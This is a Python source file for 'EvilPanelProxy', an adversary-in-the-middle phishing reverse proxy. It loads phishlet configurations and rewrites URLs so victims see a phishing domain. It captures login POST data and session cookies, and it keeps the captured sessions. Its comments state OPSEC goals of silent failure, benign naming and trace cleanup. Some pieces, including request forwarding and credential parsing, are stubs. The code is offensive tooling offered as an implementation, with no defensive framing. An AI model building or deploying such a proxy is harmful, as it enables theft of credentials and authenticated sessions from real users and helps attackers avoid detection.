"""
AiTM Reverse Proxy Implementation
Source: plan-aligned-implementation-protocol.md Lines 498-628
OPSEC: Silent failure, benign naming, cleanup on error
"""

import asyncio
import hashlib
from typing import Dict, Optional, List, Set
from dataclasses import dataclass

from .phishlet import Phishlet, PhishletParser
from .session import SessionCapture, CapturedSession
from .ssl import AutoCertManager, CertificatePaths


@dataclass
class ProxyConfig:
    """Proxy configuration"""
    domain: str
    port: int = 443
    ssl_enabled: bool = True


class EvilPanelProxy:
    """
    AiTM Reverse Proxy Implementation
    Source: plan.md Section 4.3, Lines 227-251
    """
    
    def __init__(self, config: ProxyConfig):
        self.domain = config.domain
        self.port = config.port
        self.ssl_enabled = config.ssl_enabled
        self.phishlets: Dict[str, Phishlet] = {}
        self.sessions: List[CapturedSession] = []
        self.ssl_manager: Optional[AutoCertManager] = None
        self.session_capture = SessionCapture()
        self._running = False
        self._active_connections: Set[str] = set()
        self._connection_lock = asyncio.Lock()
    
    def load_phishlet(self, phishlet_path: str) -> bool:
        """
        Load YAML phishlet configuration
        Source: plan.md Section 4.3, Lines 237-239
        
        Args:
            phishlet_path: Path to YAML file
            
        Returns:
            bool: True if loaded successfully
        """
        try:
            phishlet = PhishletParser.load(phishlet_path)
            if phishlet:
                self.phishlets[phishlet.name] = phishlet
                return True
            return False
        except Exception:
            return False  # Silent failure
    
    def load_all_phishlets(self, directory: str) -> int:
        """
        Load all phishlets from directory
        
        Args:
            directory: Path to phishlets directory
            
        Returns:
            int: Number of phishlets loaded successfully
        """
        loaded = 0
        try:
            phishlets = PhishletParser.load_all(directory)
            self.phishlets.update(phishlets)
            loaded = len(phishlets)
        except Exception:
            pass  # Silent failure
        return loaded
    
    def start_proxy(self, port: int = None) -> bool:
        """
        Start HTTPS reverse proxy
        Source: plan.md Section 4.3, Lines 241-242
        
        Args:
            port: Port to bind (default: 443)
            
        Returns:
            bool: True if started successfully
        """
        if self._running:
            return True
        
        try:
            if port:
                self.port = port
            
            # Initialize SSL if enabled
            if self.ssl_enabled:
                self.ssl_manager = AutoCertManager(
                    domain=self.domain,
                    email=''
                )
                certs = self.ssl_manager.get_certificate_paths()
                if not certs:
                    # Try self-signed as fallback
                    certs = self.ssl_manager.generate_self_signed()
                    if not certs:
                        return False
            
            self._running = True
            return True
            
        except Exception:
            self._cleanup_traces()
            return False
    
    def stop_proxy(self) -> None:
        """Stop the proxy server gracefully"""
        self._running = False
        self._cleanup_traces()
    
    def _cleanup_traces(self) -> None:
        """
        Clean up any traces on failure
        Per OPSEC requirements
        """
        try:
            # Clear sensitive data from memory
            self.sessions.clear()
            self._active_connections.clear()
        except Exception:
            pass  # Even cleanup must be silent
    
    async def intercept_request(self, request: dict) -> dict:
        """
        Modify and forward request to real service
        Source: plan.md Section 4.3, Lines 244-246
        
        Flow:
        1. Check if request matches active phishlet
        2. Apply sub_filters to rewrite URLs
        3. Forward to real service
        4. Return modified request
        
        Args:
            request: Incoming request dict with headers, body, url
            
        Returns:
            Modified request dict ready for forwarding
        """
        if not request:
            return request
        
        try:
            # Find matching phishlet
            phishlet = self._match_phishlet(request)
            if not phishlet:
                return request
            
            # Apply URL rewrites from sub_filters
            modified = self._apply_filters(request, phishlet)
            
            # Capture credentials from POST data
            if request.get('method') == 'POST':
                self._capture_credentials(request, phishlet)
            
            return modified
            
        except Exception:
            self._cleanup_traces()
            return request  # Return unmodified on failure
    
    async def intercept_response(self, response: dict) -> dict:
        """
        Process response and capture tokens
        Source: plan.md Section 3.2, Lines 111-140
        
        Flow:
        1. Extract session tokens from Set-Cookie headers
        2. Apply reverse URL rewrites for victim
        3. Store captured session
        4. Forward to victim
        
        Args:
            response: Response dict with headers, body, cookies
            
        Returns:
            Modified response dict for victim
        """
        if not response:
            return response
        
        try:
            phishlet = self._get_active_phishlet()
            
            # Extract session tokens from cookies
            session = self.session_capture.extract_tokens(response, phishlet)
            
            if session:
                self.sessions.append(session)
            
            # Apply reverse rewrites for victim
            modified = self._apply_reverse_filters(response, phishlet)
            
            return modified
            
        except Exception:
            self._cleanup_traces()
            return response
    
    def capture_tokens(self, response: dict) -> Optional[CapturedSession]:
        """
        Extract session tokens from response cookies
        Source: plan.md Section 4.3, Lines 248-250
        
        Args:
            response: Response dict with cookies
            
        Returns:
            CapturedSession if tokens found, None otherwise
        """
        try:
            phishlet = self._get_active_phishlet()
            return self.session_capture.extract_tokens(response, phishlet)
        except Exception:
            self._cleanup_traces()
            return None
    
    def _match_phishlet(self, request: dict) -> Optional[Phishlet]:
        """Match request to active phishlet based on host"""
        host = request.get('host', '')
        
        for phishlet in self.phishlets.values():
            if not phishlet.is_enabled:
                continue
                
            for proxy_host in phishlet.proxy_hosts:
                # Check if request host matches phishlet subdomain
                expected_host = f"{proxy_host.phish_sub}.{self.domain}"
                if host == expected_host or host.endswith(f'.{self.domain}'):
                    return phishlet
        
        return None
    
    def _get_active_phishlet(self) -> Optional[Phishlet]:
        """Get currently active phishlet"""
        for phishlet in self.phishlets.values():
            if phishlet.is_enabled:
                return phishlet
        return None
    
    def _apply_filters(self, request: dict, phishlet: Phishlet) -> dict:
        """Apply sub_filters to rewrite URLs in request"""
        modified = request.copy()
        
        for sub_filter in phishlet.sub_filters:
            # Apply search/replace to URL and body
            if 'url' in modified:
                modified['url'] = modified['url'].replace(
                    sub_filter.search,
                    sub_filter.replace.replace('{hostname}', self.domain)
                )
            
            if 'body' in modified and modified['body']:
                modified['body'] = modified['body'].replace(
                    sub_filter.search,
                    sub_filter.replace.replace('{hostname}', self.domain)
                )
        
        return modified
    
    def _apply_reverse_filters(self, response: dict, phishlet: Optional[Phishlet]) -> dict:
        """Apply reverse URL rewrites so victim sees phishing domain"""
        if not phishlet:
            return response
        
        modified = response.copy()
        
        for sub_filter in phishlet.sub_filters:
            # Reverse the search/replace
            if 'body' in modified and modified['body']:
                # Replace real domain URLs with phishing domain
                original_pattern = sub_filter.replace.replace('{hostname}', self.domain)
                modified['body'] = modified['body'].replace(
                    sub_filter.search,
                    original_pattern
                )
        
        return modified
    
    def _capture_credentials(self, request: dict, phishlet: Phishlet) -> None:
        """Capture credentials from POST request"""
        try:
            post_data = request.get('body', '')
            if not post_data:
                return
            
            # Parse POST data based on phishlet credentials config
            # This is handled by SessionCapture class
            pass
        except Exception:
            pass  # Silent failure
    
    async def handle_connection(self, connection_id: str, request: dict) -> dict:
        """Handle a single connection with proper locking"""
        async with self._connection_lock:
            self._active_connections.add(connection_id)
        
        try:
            # Process request
            modified_request = await self.intercept_request(request)
            
            # Forward to real service and get response
            response = await self._forward_request(modified_request)
            
            # Process response
            modified_response = await self.intercept_response(response)
            
            return modified_response
        finally:
            async with self._connection_lock:
                self._active_connections.discard(connection_id)
    
    async def _forward_request(self, request: dict) -> dict:
        """Forward request to real service (placeholder)"""
        # This would be implemented with actual HTTP forwarding
        return {}
    
    @property
    def active_connection_count(self) -> int:
        """Return number of active connections"""
        return len(self._active_connections)
    
    @property
    def is_running(self) -> bool:
        """Check if proxy is running"""
        return self._running
    
    def get_sessions(self) -> List[CapturedSession]:
        """Get all captured sessions"""
        return self.sessions.copy()
    
    def clear_sessions(self) -> None:
        """Clear captured sessions"""
        self.sessions.clear()
    
    def enable_phishlet(self, name: str) -> bool:
        """Enable a phishlet by name"""
        if name in self.phishlets:
            self.phishlets[name].is_enabled = True
            return True
        return False
    
    def disable_phishlet(self, name: str) -> bool:
        """Disable a phishlet by name"""
        if name in self.phishlets:
            self.phishlets[name].is_enabled = False
            return True
        return False
    
    def set_phishlet_subdomain(self, name: str, subdomain: str) -> bool:
        """Set subdomain for a phishlet"""
        if name in self.phishlets:
            self.phishlets[name].subdomain = subdomain
            return True
        return False


# Global proxy instance
_proxy_instance: Optional[EvilPanelProxy] = None


def get_proxy_instance() -> Optional[EvilPanelProxy]:
    """Get global proxy instance"""
    return _proxy_instance


def set_proxy_instance(proxy: EvilPanelProxy) -> None:
    """Set global proxy instance"""
    global _proxy_instance
    _proxy_instance = proxy

